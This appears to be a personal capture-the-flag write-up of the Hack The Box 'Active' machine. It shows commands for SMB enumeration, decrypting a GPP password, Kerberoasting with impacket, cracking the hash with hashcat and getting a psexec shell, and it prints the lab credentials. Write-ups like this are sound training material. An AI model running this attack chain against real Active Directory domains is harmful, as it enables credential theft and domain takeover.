[[Enumeration]][[nmap]]
#Enumeration #nmap
`nmap -sC -sV -oA nmap/active 10.10.10.100`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`
![[Pasted image 20241209204527.png|nmap scan]]
Key things to note:
* DNS open with version 6.1.7601 which means version 7 = Windows 2008 or Windows service pack 1. If it was 9000 range it would be 2012 = Windows 10. 
* If Kerberos is open then look for LDAP and if they're both open, assume you're on Windows AD box.
* domain name = active.htb -> edit `/etc/hosts` to include
![[Pasted image 20241209205206.png]]

#Enumeration 
#nslookup to find the hostname
`nslookup 10.10.10.100`
#dnsrecon
`dnsrecon -d 10.10.10.100 -r 10.0.0.0/8`
#smbclient
`smbclient -L //10.10.10.100`
![[Pasted image 20241209210112.png]]
#enum4linux (outdated)
`enum4linux 10.10.10.100`
#smbmap
`smbmap -H 10.10.10.100`
![[Pasted image 20241209210439.png]]
List the contents of the Replication share using smbmap
`smbmap -R Replication -H 10.10.10.100`
Discover groups.xml file 
![[Pasted image 20241209211157.png]]
Download groups.xml using smbmap
`smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q`
Run 
`locate Groups.xml`
to see the location smbmap has stored the file. 
![[Pasted image 20241210181609.png]]
#credentialaccess
Run `less` against the file to grab an encrypted password
![[Pasted image 20241210181744.png]]
Use `gpp-decrypt` to decrypt the password
![[Pasted image 20241210181946.png]]
This #gpp tool is within Kali's repo. 

Alternate method to get these credentials using #smbclient 
`smbclient //10.10.10.100/Replication`
`mget *`
`recurse ON`
`prompt OFF`
`mget *`
All files will get downloaded
`find . -type f`
Notice group policy file
![[Pasted image 20241210183104.png]]
Install #impacket
Run `GetADUsers.py -all  -dc-ip 10.10.10.100 active.htb/svc_tgs`
Enter password found for svc_tgs
Result
![[Pasted image 20241210183649.png]]
Look for more network shares
`smbmap -d active.htb -u svc_tgs -p GPPStillStandingStrong2k18 -H 10.10.10.100`
![[Pasted image 20241210184144.png]]
Cannot psexec because user is not an admin.

Switch to Windows box to use these credentials

Open command prompt and run 
`runas /netonly /user:active.htb\svc_tgs`
![[Pasted image 20241210184728.png]]
Confirm access with
`dir \\10.10.10.100\Users`

After initial access is gained, copy #Bloodhound over. 

![[Pasted image 20241210185013.png]]
`python -m SimpleHTPPServer`

Just open web browser on Windows box and navigate to IP address of linux box over port 80 to download #sharphound.exe

Run `Sharphound.exe`
`.\Sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.100`
This fails. 
Troubleshooting steps:
1. Test connection to ldap `Test-Connection -ComputerName 10.10.10.100 -Port 389`
2. Run Sharphound again with Wireshark open
3. Set DNS server to 10.10.10.100   in IP Properties ![[Pasted image 20241210185923.png]]
Sharphound results:
![[Pasted image 20241210190158.png]]
Switching back to Kali box to view the contents of Bloodhound. 

Start #neo4j

`neo4j start`

`cd Bloodhound-linux-x64`

`./Bloodhound`

![[Pasted image 20241210190538.png]]

Refresh screen by pressing f5

Drag and drop BloodHound.zip file into the BloodHound window. 

Searching through BloodHound

![[Pasted image 20241210190809.png]]

Look at common queries. 

Search "Find Shortest Paths to Domain Admin"

![[Pasted image 20241210190914.png]]
Search "Shortest Paths from Kerberoastable Users"

Discover the user "Administrator" is kerberoastable. 

This means we can run #impacket again using #GetUserSPNs .py

Run `GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs`
Enter password for svc_tgs. 

Successful #kerberoasting

![[Pasted image 20241210191620.png]]
Search for which mode of #hashcat to use on hashcat.net search: example hashes to crack admin password. 

we have krb5tgs. 

Save hash to a file. 

Use #hashcat for #passwordcracking 

`hashcat -m 13100 hashes/active.htb /opt/wordlist/rockyou.txt 
`
Retrieve admin password from this crack. 

`TicketMaster1968`

Finally use admin password with #psexec to get root.txt

`psexec.py active.htb/Administrator@10.10.10.100`

